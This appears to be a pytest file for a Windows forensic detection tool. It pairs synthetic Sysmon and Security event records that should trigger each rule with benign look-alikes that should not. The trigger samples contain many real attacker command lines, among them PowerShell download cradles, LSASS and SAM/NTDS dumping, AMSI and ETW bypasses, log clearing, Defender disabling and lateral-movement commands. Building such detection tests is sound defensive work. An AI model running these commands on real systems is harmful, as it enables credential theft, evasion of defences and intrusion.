"""Windows behaviour rules: each fires on the behaviour and not on a near look-alike."""

from __future__ import annotations

import pytest

from auto_forensics.models import ArtifactEvent
from auto_forensics.windows_rules import RULES, WindowsRuleDetector, rule_matches

SHA = "a" * 64
SYSMON = "Microsoft-Windows-Sysmon"
RULE = {rule.rule_id: rule for rule in RULES}


def ev(event_id: int, provider: str = SYSMON, row: int = 1, **fields: str) -> ArtifactEvent:
    meta = {"event_id": event_id, "provider": provider, "channel": "", "source_file": "x.evtx",
            "source_sha256": SHA, "row": row}
    meta.update(fields)
    return ArtifactEvent(artifact_id=f"e{row}", timestamp=None, event_type=f"windows_event_{event_id}",
                         description="", source="x.evtx", metadata=meta)


HITS = [
    ("ps-encoded", ev(1, Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                      CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi")),
    ("ps-download", ev(4688, "Microsoft-Windows-Security-Auditing", NewProcessName=r"C:\x\powershell.exe",
                       CommandLine="powershell IEX (New-Object Net.WebClient).DownloadString('http://x/a')")),
    ("script-from-office", ev(1, ParentImage=r"C:\Program Files\Microsoft Office\WINWORD.EXE",
                              Image=r"C:\Windows\System32\cmd.exe", CommandLine="cmd /c whoami")),
    ("lolbin-proxy", ev(1, Image=r"C:\Windows\System32\regsvr32.exe",
                        CommandLine="regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll")),
    ("wmi-spawn", ev(1, ParentImage=r"C:\Windows\System32\wbem\WmiPrvSE.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("registry-autorun", ev(13, TargetObject=r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\upd")),
    ("registry-ifeo", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution "
                                          r"Options\sethc.exe\Debugger")),
    ("uac-bypass-registry", ev(13, TargetObject=r"HKU\S-1\Software\Classes\ms-settings\shell\open\command\(Default)")),
    ("lsass-access", ev(10, SourceImage=r"C:\Users\a\procdump64.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                        GrantedAccess="0x1fffff")),
    ("lsass-access", ev(10, SourceImage=r"C:\Users\a\Desktop\mimikatz.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                        GrantedAccess="0x00001010")),
    ("lsass-handle", ev(4656, "Microsoft-Windows-Security-Auditing", ObjectName=r"\Device\HarddiskVolume1\Windows\System32\lsass.exe",
                        AccessMask="0x001f3fff", ProcessName=r"C:\Windows\System32\cscript.exe")),
    ("lsass-writes-file", ev(11, Image=r"C:\Windows\system32\lsass.exe", TargetFilename=r"C:\Windows\System32\mimilsa.log")),
    ("process-memory-read", ev(10, SourceImage=r"C:\Users\b\AppData\Local\Temp\x\helper.exe",
                               TargetImage=r"C:\Program Files\App\App.exe", GrantedAccess="0x0000147a")),
    ("lsass-access", ev(10, SourceImage=r"c:\python27\python.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                        GrantedAccess="0x00101ffb")),
    ("uac-com-shell", ev(1, ParentImage=r"C:\Windows\System32\dllhost.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("autoelevate-from-user-folder", ev(1, ParentImage=r"C:\Users\a\Desktop\tool.exe",
                                        Image=r"C:\Windows\System32\eventvwr.exe")),
    ("autoelevate-dll-hijack", ev(7, Image=r"C:\Windows\System32\mmc.exe",
                                  ImageLoaded=r"C:\Users\a\AppData\Local\Temp\pe386.dll")),
    ("dll-sideload", ev(7, Image=r"C:\Windows\System32\wuauclt.exe", ImageLoaded=r"C:\Users\Public\x.dll")),
    ("uac-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\EnableLUA",
                        Details="DWORD (0x00000000)")),
    ("ps-logging-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
                                                r"\ScriptBlockLogging\EnableScriptBlockLogging", Details="DWORD (0x00000000)")),
    ("ps-logging-disabled", ev(12, TargetObject=r"HKLM\System\CurrentControlSet\Control\SESSION MANAGER\Environment"
                                                r"\__PSLockdownPolicy")),
    ("port-proxy", ev(13, TargetObject=r"HKLM\System\CurrentControlSet\services\PortProxy\v4tov4\tcp\1.2.3.4/8001")),
    ("rid-hijack", ev(13, Image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
                      TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F5\F")),
    ("hidden-account", ev(13, Image=r"C:\Windows\system32\lsass.exe",
                          TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\hideme0007$\(Default)")),
    ("lolbin-proxy", ev(1, CommandLine=r'"C:\Windows\System32\rundll32.exe" zipfldr.dll,RouteTheCall c:\x\calc.exe')),
    ("lolbin-proxy", ev(1, CommandLine="desktopimgdownldr.exe /lockscreenurl:https://x/a.7z /eventName:x")),
    ("lolbin-proxy", ev(1, CommandLine=r'"c:\windows\system32\wscript.exe" /E:vbs c:\windows\temp\icon.ico')),
    ("odd-parent-shell", ev(1, ParentImage=r"C:\Program Files\Internet Explorer\iexplore.exe",
                            Image=r"C:\Windows\System32\cmd.exe")),
    ("odd-parent-shell", ev(1, ParentImage=r"C:\Program Files\MSSQL\Binn\sqlservr.exe",
                            Image=r"C:\Windows\System32\cmd.exe")),
    ("pipe-impersonation", ev(17, PipeName=r"\RoguePotato\pipe\epmapper")),
    ("getsystem-pipe", ev(1, CommandLine=r"cmd.exe /c echo msdhch > \\.\pipe\msdhch")),
    ("mssql-xp-cmdshell", ev(15457, "MSSQLSERVER", Data="xp_cmdshell | 0 | 1")),
    ("winrm-shell", ev(91, "Microsoft-Windows-WinRM")),
    ("bits-job", ev(59, "Microsoft-Windows-Bits-Client", url="https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z")),
    ("bits-job", ev(59, "Microsoft-Windows-Bits-Client", url=r"C:\Windows\system32\cmd.exe")),
    ("silent-exit-lsass", ev(3001, "Microsoft-Windows-ProcessExitMonitor", param1=r"C:\Windows\System32\lsass.exe")),
    ("boot-debug-signing", ev(4826, "Microsoft-Windows-Security-Auditing", KernelDebug="%%1842", TestSigning="%%1843")),
    ("eventlog-service-down", ev(7036, "Service Control Manager", param1="Windows Event Log", param2="stopped")),
    ("sedebug-enabled", ev(4703, "Microsoft-Windows-Security-Auditing", EnabledPrivilegeList="SeDebugPrivilege",
                           ProcessName=r"C:\Users\IEUser\Desktop\x64\mimikatz.exe")),
    ("local-group-enum", ev(4799, "Microsoft-Windows-Security-Auditing", SubjectUserName="jbrown",
                            CallerProcessName=r"C:\Windows\System32\net1.exe")),
    ("psh-obfuscation", ev(800, "PowerShell", Data="&('ne'+'w-'+'item') $eNV:teMP -itemtype DIrectOry;[x]::\"SecURi`T`ypRO`T`oCOL\"")),
    ("mssql-sa-failure", ev(18456, "MSSQLSERVER", Data="sa | Reason: Password did not match")),
    ("compile-after-delivery", ev(1, Image=r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                                  ParentImage=r"C:\Windows\System32\cmd.exe",
                                  CommandLine=r"csc.exe /unsafe /nologo /target:exe /out:zoom-update.exe C:\Users\a\x.cs")),
    ("ps-downgrade", ev(400, "PowerShell", Data="Available | None | HostVersion=2.0\n\tEngineVersion=2.0")),
    ("cve-exploit-audit", ev(1, "Microsoft-Windows-Audit-CVE", CVEID="[CVE-2020-0601] cert validation")),
    ("ad-delegation-set", ev(4742, "Microsoft-Windows-Security-Auditing", AllowedToDelegateTo="cifs/dc01.corp.local")),
    ("ad-dcshadow-spn", ev(4742, "Microsoft-Windows-Security-Auditing", ServicePrincipalNames="GC/ws01.corp.local/corp.local")),
    ("ad-sensitive-attribute", ev(5136, "Microsoft-Windows-Security-Auditing", AttributeLDAPDisplayName="msDS-KeyCredentialLink")),
    ("ad-adminsdholder", ev(5136, "Microsoft-Windows-Security-Auditing", ObjectDN="CN=AdminSDHolder,CN=System,DC=corp,DC=local")),
    ("gpp-password-read", ev(5145, "Microsoft-Windows-Security-Auditing", ShareName=r"\\*\SYSVOL",
                             RelativeTargetName=r"corp.local\Policies\{X}\Machine\Preferences\Groups\Groups.xml")),
    ("ntds-sam-file-access", ev(4663, "Microsoft-Windows-Security-Auditing", ObjectName=r"C:\Windows\NTDS\ntds.dit", ProcessName=r"C:\Temp\x.exe")),
    ("lsass-access", ev(10, SourceImage=r"C:\Users\a\Downloads\CSFalconService.exe",
                        TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess="0x1010")),
    ("registry-autorun", ev(13, TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
                            Details=r"C:\Program Files\Updater\up.exe -c powershell -enc AAAA")),
    ("registry-autorun", ev(13, TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\x",
                            Details=r"C:\Users\a\AppData\Roaming\svc\svchost.exe")),
    ("user-writable-network", ev(3, Image=r"C:\Users\a\AppData\Roaming\svc\svchost.exe", DestinationPort="443")),
    ("cmd-obfuscation", ev(1, CommandLine=r"c^m^d /c p^o^w^e^r^s^h^e^l^l -c whoami")),
    ("cmd-obfuscation", ev(1, CommandLine=r"cmd /c %COMSPEC:~-7,1%%COMSPEC:~-16,1%%COMSPEC:~-5,1%%COMSPEC:~4,1%")),
    ("cmd-obfuscation", ev(1, CommandLine=r'c""m""d""e /c whoami')),
    ("lsass-dump-cmd", ev(1, CommandLine=r"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\t\l.dmp full")),
    ("hive-dump", ev(1, CommandLine=r"reg save HKLM\SAM C:\temp\sam.save")),
    ("ntds-dump", ev(1, CommandLine='ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q')),
    ("dcsync", ev(4662, "Microsoft-Windows-Security-Auditing", SubjectUserName="mallory",
                  Properties="{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}")),
    ("kerberoast", ev(4769, "Microsoft-Windows-Security-Auditing", TicketEncryptionType="0x17", ServiceName="sqlsvc")),
    ("service-install-suspicious", ev(7045, "Service Control Manager",
                                      ImagePath=r"%COMSPEC% /C echo whoami > \\127.0.0.1\C$\x.txt")),
    ("psexec-pipe", ev(17, PipeName=r"\PSEXESVC")),
    ("pth-logon", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="9", LogonProcessName="seclogo")),
    ("admin-share-write", ev(5145, "Microsoft-Windows-Security-Auditing", ShareName=r"\\*\ADMIN$",
                             RelativeTargetName="PSEXESVC.exe")),
    ("log-cleared-cmd", ev(1, CommandLine="wevtutil cl Security")),
    ("shadow-delete", ev(1, CommandLine="vssadmin.exe delete shadows /all /quiet")),
    ("av-tamper", ev(1, CommandLine="powershell Set-MpPreference -DisableRealtimeMonitoring $true")),
    ("domain-discovery", ev(1, CommandLine="net group \"domain admins\" /domain")),
    ("lolbin-network", ev(3, Image=r"C:\Windows\System32\mshta.exe", DestinationIp="93.184.216.34",
                          DestinationPort="443")),
    ("psh-scriptblock", ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText="Invoke-Mimikatz -DumpCreds")),
    ("wmi-subscription", ev(20)),
    ("masquerade-renamed", ev(1, Image=r"C:\Users\a\svch0st.exe", OriginalFileName="psexec.exe")),
    ("rdp-tunnel", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="10", IpAddress="127.0.0.1")),
    ("startup-file", ev(11, TargetFilename=r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
                                           r"\Startup\evil.lnk")),
    ("credential-dump-file", ev(11, TargetFilename=r"C:\Windows\Temp\lsass.dmp")),
    # defense evasion (loop 58)
    ("driver-from-user-folder", ev(6, ImageLoaded=r"C:\Users\a\AppData\Local\Temp\gdrv.sys", Signed="true")),
    ("driver-service-user-folder", ev(7045, "Service Control Manager", ImagePath=r"C:\Users\Public\rtcore64.sys",
                                      ServiceType="kernel mode driver")),
    ("masquerade-system-path", ev(1, Image=r"C:\Users\Public\svchost.exe", CommandLine="svchost.exe -k netsvcs")),
    ("masquerade-system-path", ev(4688, "Microsoft-Windows-Security-Auditing",
                                  NewProcessName=r"C:\ProgramData\Microsoft\lsass.exe")),
    ("timestomp", ev(2, Image=r"C:\Users\a\Downloads\update.exe", TargetFilename=r"C:\Users\a\AppData\Roaming\x.dat")),
    ("timestomp", ev(2, Image=r"C:\Tools\touch.exe", TargetFilename=r"C:\Windows\System32\evil.dll")),
    ("process-inject-access", ev(10, SourceImage=r"C:\Users\a\AppData\Local\Temp\ldr.exe",
                                 TargetImage=r"C:\Windows\explorer.exe", GrantedAccess="0x1F0FFF")),
    ("process-tampering", ev(25, Image=r"C:\Users\a\Downloads\target.exe", Type="Image is replaced")),
    ("lolbin-user-folder", ev(1, CommandLine=r"rundll32.exe C:\Users\a\AppData\Local\Temp\payload.dll,Start")),
    ("lolbin-user-folder", ev(1, CommandLine=r"rundll32.exe c:\windows\temp\update.dat,DllRegisterServer")),
    ("amsi-etw-tamper-cmd", ev(1, CommandLine="powershell -c \"[Ref].Assembly.GetType('System.Management.Automation."
                                              "AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')\"")),
    ("logging-tamper-cmd", ev(1, CommandLine="auditpol /clear /y")),
    ("logging-tamper-cmd", ev(4688, "Microsoft-Windows-Security-Auditing",
                              CommandLine="wevtutil sl Microsoft-Windows-PowerShell/Operational /e:false")),
    ("logging-tamper-cmd", ev(1, CommandLine="fltmc.exe unload SysmonDrv")),
    ("defense-evasion-script", ev(4104, "Microsoft-Windows-PowerShell",
                                  ScriptBlockText="[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType("
                                                  "'System.Diagnostics.Eventing.EventProvider').GetField('m_enabled')")),
    ("defense-evasion-script", ev(4104, "Microsoft-Windows-PowerShell",
                                  ScriptBlockText="Set-MpPreference -DisableRealtimeMonitoring $true")),
    ("indicator-removal-cmd", ev(1, CommandLine=r"cmd /c del C:\Windows\System32\winevt\Logs\Security.evtx")),
    ("indicator-removal-cmd", ev(1, CommandLine="powershell Remove-Item (Get-PSReadlineOption).HistorySavePath; "
                                                "Clear-History")),
    ("evtx-deleted", ev(23, Image=r"C:\Users\a\x.exe", TargetFilename=r"C:\Windows\System32\winevt\Logs\System.evtx")),
    ("boot-config-cmd", ev(1, CommandLine="bcdedit /set testsigning on")),
    ("ads-cmd", ev(1, CommandLine=r"type C:\temp\evil.exe > C:\temp\readme.txt:evil.exe")),
    ("ads-cmd", ev(1, CommandLine=r"powershell Set-Content -Path C:\x\a.txt -Stream payload -Value $b")),
    ("ads-executable", ev(15, TargetFilename=r"C:\Users\a\Documents\report.docx:loader.ps1")),
    ("firewall-open-cmd", ev(1, CommandLine='netsh advfirewall firewall add rule name="x" dir=in action=allow '
                                            'program="C:\\Users\\Public\\svc.exe"')),
    ("firewall-open-cmd", ev(1, CommandLine="netsh advfirewall firewall add rule name=rdp dir=in protocol=tcp "
                                            "localport=3389 action=allow")),
    ("firewall-open-cmd", ev(1, CommandLine="powershell Set-NetFirewallProfile -Profile Domain -Enabled False")),
    ("firewall-rule-user-folder", ev(2004, "Microsoft-Windows-Windows Firewall With Advanced Security",
                                     ApplicationPath=r"C:\Users\a\AppData\Roaming\svc\svc.exe")),
    ("defender-off-event", ev(5001, "Microsoft-Windows-Windows Defender")),
    ("defender-config-weakened", ev(5007, "Microsoft-Windows-Windows Defender",
                                    **{"New Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\x = 0x0"})),
    ("defender-config-weakened", ev(5007, "Microsoft-Windows-Windows Defender",
                                    **{"New Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
                                                    r"\DisableRealtimeMonitoring = 0x1"})),
    ("security-registry-weakened", ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"
                                                       r"\DisableAntiSpyware", Details="DWORD (0x00000001)")),
    ("security-registry-weakened", ev(4657, "Microsoft-Windows-Security-Auditing",
                                      ObjectName=r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinDefend",
                                      ObjectValueName="Start", NewValue="4")),
    ("security-registry-weakened", ev(4657, "Microsoft-Windows-Security-Auditing",
                                      ObjectName=r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
                                                 r"\Policies\System", ObjectValueName="EnableLUA", NewValue="0")),
    ("system-time-changed", ev(4616, "Microsoft-Windows-Security-Auditing",
                               ProcessName=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")),
    ("security-service-stopped", ev(7040, "Service Control Manager", param1="Windows Defender Antivirus Service",
                                    param2="auto start", param3="disabled")),
    ("security-service-stopped", ev(7036, "Service Control Manager", param1="Windows Defender Firewall",
                                    param2="stopped")),
    ("av-tamper", ev(1, CommandLine=r'"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All')),
    # lateral movement (loop 58)
    ("winrm-shell", ev(169, "Microsoft-Windows-WinRM", username="corp\\bob", authenticationMechanism="NTLM")),
    ("ps-remote-session", ev(400, "PowerShell", Data="Available | None | HostName=ServerRemoteHost\n\tHostApplication="
                                                     "C:\\Windows\\system32\\wsmprovhost.exe -Embedding")),
    ("pth-ntlm-logon", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="3", AuthenticationPackageName="NTLM",
                          LogonProcessName="NtLmSsp ", KeyLength="0", TargetUserName="Administrator",
                          IpAddress="10.0.0.66")),
    ("rdp-inbound", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="10", IpAddress="10.0.0.66")),
    ("rdp-inbound", ev(1149, "Microsoft-Windows-TerminalServices-RemoteConnectionManager", Param3="10.0.0.66")),
    ("rdp-inbound", ev(131, "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", ClientIP="10.0.0.66:52202")),
    ("psexec-service-process", ev(1, ParentImage=r"C:\Windows\PSEXESVC.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("psexec-service-process", ev(4688, "Microsoft-Windows-Security-Auditing", NewProcessName=r"C:\Windows\PAExec-1234-WS1.exe",
                                  ParentProcessName=r"C:\Windows\System32\services.exe")),
    ("smb-file-drop", ev(11, Image="System", TargetFilename=r"C:\Windows\Temp\beacon.exe")),
    ("admin-share-access", ev(5140, "Microsoft-Windows-Security-Auditing", ShareName=r"\\*\C$",
                              SubjectUserName="admin", IpAddress="10.0.0.66")),
    ("admin-share-cmd", ev(1, CommandLine=r"net use \\ws02\ADMIN$ /user:corp\admin P@ss")),
    ("remote-exec-output-share", ev(1, ParentImage=r"C:\Windows\System32\wbem\WmiPrvSE.exe",
                                    CommandLine=r"cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1636981455.31 2>&1")),
    ("dcom-mmc", ev(1, Image=r"C:\Windows\System32\mmc.exe", CommandLine=r"C:\Windows\system32\mmc.exe -Embedding",
                    ParentImage=r"C:\Windows\System32\svchost.exe")),
    ("remote-exec-script", ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText="$c = [activator]::CreateInstance("
                                    "[type]::GetTypeFromProgID('MMC20.Application', '10.0.0.5'))")),
    ("remote-exec-script", ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText="Invoke-SMBExec -Target 10.0.0.5 "
                                    "-Hash aad3b435b51404ee")),
    ("remote-access-registry", ev(13, TargetObject=r"HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin",
                                  Details="DWORD (0x00000000)")),
    ("rdp-hijack", ev(4697, "Microsoft-Windows-Security-Auditing", ServiceFileName="cmd.exe /k tscon 2 /dest rdp-tcp#1")),
    ("service-install-suspicious", ev(7045, "Service Control Manager", ImagePath=r"%SYSTEMROOT%\duKhLYUX.exe")),
    ("remote-exec-tools", ev(1, CommandLine=r"schtasks /create /s 10.0.0.5 /tn upd /tr C:\x.exe /sc once /st 10:00")),
    ("remote-exec-tools", ev(1, CommandLine=r"sc \\ws02 create upd binpath= C:\Windows\x.exe")),
]

MISSES = [
    # same field, ordinary value
    ("ps-encoded", ev(1, Image=r"C:\x\powershell.exe", CommandLine="powershell.exe -File C:\\scripts\\backup.ps1")),
    ("script-from-office", ev(1, ParentImage=r"C:\Windows\explorer.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("registry-autorun", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\x")),
    ("lsass-access", ev(10, SourceImage=r"C:\Windows\System32\svchost.exe", TargetImage=r"C:\Windows\lsass.exe",
                        GrantedAccess="0x1fffff")),
    ("lsass-access", ev(10, SourceImage=r"C:\a\x.exe", TargetImage=r"C:\Windows\lsass.exe", GrantedAccess="0x1000")),
    ("lsass-handle", ev(4663, "Microsoft-Windows-Security-Auditing", ObjectName=r"\Windows\System32\lsass.exe",
                        AccessMask="0x00000004", ProcessName=r"C:\x\tool.exe")),
    ("process-memory-read", ev(10, SourceImage=r"C:\Users\b\AppData\Local\Temp\x.exe",
                               TargetImage=r"C:\Program Files\App\App.exe", GrantedAccess="0x00001000")),
    ("dcsync", ev(4662, "Microsoft-Windows-Security-Auditing", SubjectUserName="DC01$",
                  Properties="{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}")),
    ("kerberoast", ev(4769, "Microsoft-Windows-Security-Auditing", TicketEncryptionType="0x12", ServiceName="sqlsvc")),
    ("kerberoast", ev(4769, "Microsoft-Windows-Security-Auditing", TicketEncryptionType="0x17", ServiceName="DC01$")),
    ("pth-logon", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="2", LogonProcessName="User32")),
    ("uac-com-shell", ev(1, ParentImage=r"C:\Windows\explorer.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("lolbin-proxy", ev(1, CommandLine=r'"c:\windows\system32\wscript.exe" /E:vbs c:\scripts\logon.vbs')),
    ("lolbin-proxy", ev(1, CommandLine=r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl")),
    ("odd-parent-shell", ev(1, ParentImage=r"C:\Windows\explorer.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("pipe-impersonation", ev(17, PipeName=r"\spoolss")),
    ("cmd-obfuscation", ev(1, CommandLine=r'"C:\Program Files\App\app.exe" --title "Q^3 report" --path %TEMP%')),
    ("cmd-obfuscation", ev(1, CommandLine=r"echo %DATE:~10,4%")),
    ("lsass-access", ev(10, SourceImage=r"C:\Program Files\CrowdStrike\CSFalconService.exe",
                        TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess="0x1010")),
    ("registry-autorun", ev(13, TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive",
                            Details=r'"C:\Users\a\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background')),
    ("registry-autorun", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth",
                            Details=r"%windir%\system32\SecurityHealthSystray.exe")),
    ("user-writable-network", ev(3, Image=r"C:\Users\a\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
                                 DestinationPort="443")),
    ("ad-delegation-set", ev(4742, "Microsoft-Windows-Security-Auditing", AllowedToDelegateTo="-")),
    ("ad-sensitive-attribute", ev(5136, "Microsoft-Windows-Security-Auditing", AttributeLDAPDisplayName="description")),
    ("ntds-sam-file-access", ev(4663, "Microsoft-Windows-Security-Auditing", ObjectName=r"C:\Windows\NTDS\ntds.dit",
                                ProcessName=r"C:\Windows\System32\lsass.exe")),
    ("ps-downgrade", ev(400, "PowerShell", Data="Available | None | EngineVersion=5.1.18362.145")),
    ("cve-exploit-audit", ev(1, SYSMON, CVEID="")),
    ("boot-debug-signing", ev(4826, "Microsoft-Windows-Security-Auditing", KernelDebug="%%1843", TestSigning="%%1843")),
    ("eventlog-service-down", ev(7036, "Service Control Manager", param1="Windows Event Log", param2="running")),
    ("sedebug-enabled", ev(4703, "Microsoft-Windows-Security-Auditing", EnabledPrivilegeList="SeDebugPrivilege",
                           ProcessName=r"C:\Windows\System32\svchost.exe")),
    ("psh-obfuscation", ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText="Get-ChildItem -Path C:\\logs | Sort-Object Length")),
    ("bits-job", ev(60, "Microsoft-Windows-Bits-Client", url="http://g.live.com/odclientsettings/ProdV2")),
    ("bits-job", ev(60, "Microsoft-Windows-Bits-Client",
                    url="http://r2---sn-5hne6nsr.gvt1.com/edgedl/release2/chrome/x_chrome_updater.exe")),
    ("mssql-xp-cmdshell", ev(15457, "MSSQLSERVER", Data="max server memory | 2048 | 4096")),
    ("uac-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\EnableLUA",
                        Details="DWORD (0x00000001)")),
    ("ps-logging-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
                                                r"\ScriptBlockLogging\EnableScriptBlockLogging", Details="DWORD (0x00000001)")),
    ("rid-hijack", ev(13, Image=r"C:\Windows\system32\lsass.exe",
                      TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F5\F")),
    ("hidden-account", ev(13, Image=r"C:\Windows\system32\lsass.exe",
                          TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\bob\(Default)")),
    ("autoelevate-from-user-folder", ev(1, ParentImage=r"C:\Windows\explorer.exe",
                                        Image=r"C:\Windows\System32\eventvwr.exe")),
    ("dll-sideload", ev(7, Image=r"C:\Windows\System32\svchost.exe",
                        ImageLoaded=r"C:\Windows\System32\kernel32.dll")),
    ("lolbin-network", ev(3, Image=r"C:\Windows\System32\mshta.exe", DestinationIp="10.0.0.5", DestinationPort="443")),
    # Sysmon-only rules must not fire on another provider's event with the same ID
    ("registry-autorun", ev(13, "Some-Other-Provider", TargetObject=r"\CurrentVersion\Run\x")),
    ("wmi-subscription", ev(20, "Microsoft-Windows-Kernel-Power")),
    ("masquerade-renamed", ev(1, Image=r"C:\Windows\System32\cmd.exe", OriginalFileName="Cmd.Exe")),
    ("rdp-tunnel", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="5", IpAddress="127.0.0.1")),
    # defense evasion look-alikes (loop 58)
    ("driver-from-user-folder", ev(6, ImageLoaded=r"C:\Windows\System32\drivers\nvlddmkm.sys")),
    ("driver-service-user-folder", ev(7045, "Service Control Manager", ImagePath=r"C:\Users\a\AppData\Local\Temp\x.exe",
                                      ServiceType="user mode service")),
    ("masquerade-system-path", ev(1, Image=r"C:\Windows\System32\svchost.exe")),
    ("masquerade-system-path", ev(1, Image=r"C:\Windows\explorer.exe")),
    ("masquerade-system-path", ev(4688, "Microsoft-Windows-Security-Auditing",
                                  NewProcessName=r"\Device\HarddiskVolume2\Windows\SysWOW64\rundll32.exe")),
    ("timestomp", ev(2, Image=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                     TargetFilename=r"C:\Users\a\Downloads\setup.exe")),
    ("timestomp", ev(2, Image=r"C:\Tools\sync.exe", TargetFilename=r"C:\Users\a\Documents\notes.txt")),
    ("process-inject-access", ev(10, SourceImage=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                                 TargetImage=r"C:\Windows\System32\whoami.exe", GrantedAccess="0x1fffff")),
    ("process-inject-access", ev(10, SourceImage=r"C:\Users\a\AppData\Local\Temp\x.exe",
                                 TargetImage=r"C:\Windows\explorer.exe", GrantedAccess="0x1410")),
    ("process-tampering", ev(25, Image=r"C:\Program Files\Mozilla Firefox\firefox.exe", Type="Image is replaced")),
    ("lolbin-user-folder", ev(1, CommandLine=r"rundll32.exe C:\Windows\System32\inetcpl.cpl,ClearMyTracksByProcess 8")),
    ("lolbin-user-folder", ev(1, CommandLine=r'regsvr32 /s "C:\Users\a\AppData\Local\Microsoft\Teams\current\x.dll"')),
    ("amsi-etw-tamper-cmd", ev(1, CommandLine=r'"C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 1')),
    ("logging-tamper-cmd", ev(1, CommandLine="wevtutil qe Security /c:5 /f:text")),
    ("logging-tamper-cmd", ev(1, CommandLine="auditpol /get /category:*")),
    ("logging-tamper-cmd", ev(1, CommandLine="logman stop MyPerfTrace")),
    ("defense-evasion-script", ev(4104, "Microsoft-Windows-PowerShell",
                                  ScriptBlockText="Get-MpPreference | Select-Object ExclusionPath")),
    ("indicator-removal-cmd", ev(1, CommandLine=r"cmd /c del C:\temp\old\*.log")),
    ("evtx-deleted", ev(23, TargetFilename=r"C:\Users\a\Documents\export.csv")),
    ("boot-config-cmd", ev(1, CommandLine="bcdedit /enum")),
    ("ads-cmd", ev(1, CommandLine=r'"C:\Program Files\App\app.exe" --url https://example.com:8443/a.js')),
    ("ads-executable", ev(15, TargetFilename=r"C:\Users\a\Downloads\setup.exe:Zone.Identifier")),
    ("firewall-open-cmd", ev(1, CommandLine='netsh advfirewall firewall add rule name="App" dir=in action=allow '
                                            'program="C:\\Program Files\\App\\app.exe"')),
    ("firewall-rule-user-folder", ev(2004, "Microsoft-Windows-Windows Firewall With Advanced Security",
                                     ApplicationPath=r"C:\Users\a\AppData\Local\Microsoft\Teams\current\Teams.exe")),
    ("defender-off-event", ev(1116, "Microsoft-Windows-Windows Defender")),
    ("defender-config-weakened", ev(5007, "Microsoft-Windows-Windows Defender",
                                    **{"New Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Signature Updates"
                                                    r"\SignatureLocation = C:\ProgramData\x"})),
    ("security-registry-weakened", ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"
                                                       r"\DisableAntiSpyware", Details="DWORD (0x00000000)")),
